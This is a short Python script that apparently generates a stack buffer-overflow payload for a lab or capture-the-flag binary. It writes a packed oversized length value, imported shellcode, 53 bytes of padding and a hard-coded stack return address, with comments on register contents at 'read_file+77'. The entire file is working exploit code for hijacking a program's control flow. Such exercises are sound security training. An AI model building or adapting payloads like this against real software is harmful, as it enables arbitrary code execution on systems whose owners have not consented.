from __future__ import print_function
from shellcode import shellcode
from struct import pack

print(pack("<I",0x40000002), end = "")
print(shellcode, end = "")

print("A"*53, end = "")

print(pack("<I", 0xbffeaa10), end = "")

### read_file+77 %EAX holds location to read to
### read_file+77 %EDX hold file pointer
